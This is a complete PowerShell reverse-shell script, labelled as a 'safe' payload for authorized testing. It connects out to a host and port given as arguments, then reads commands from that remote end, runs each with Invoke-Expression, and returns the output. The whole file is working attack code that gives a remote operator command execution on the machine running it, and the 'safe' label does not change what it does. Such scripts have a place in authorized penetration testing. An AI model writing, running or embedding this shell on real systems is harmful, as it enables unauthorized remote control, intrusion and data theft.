# PowerShell Reverse Shell
# Safe reverse shell payload for authorized testing

param(
    [string]$Host,
    [int]$Port
)

if (-not $Host -or -not $Port) {
    Write-Host "Usage: powershell -File powershell_shell.ps1 -Host <host> -Port <port>"
    exit 1
}

Write-Host "Connecting to $Host`:$Port"

try {
    $client = New-Object System.Net.Sockets.TcpClient($Host, $Port)
    $stream = $client.GetStream()
    
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    
    $writer.WriteLine("PowerShell Reverse Shell Connected")
    $writer.Flush()
    
    while ($true) {
        $command = $reader.ReadLine()
        
        if ($command -eq "exit" -or $command -eq "quit") {
            break
        }
        
        try {
            $result = Invoke-Expression $command 2>&1 | Out-String
            $writer.WriteLine($result)
            $writer.Flush()
        }
        catch {
            $writer.WriteLine("Error: $_")
            $writer.Flush()
        }
    }
    
    $client.Close()
}
catch {
    Write-Host "Connection failed: $_"
}
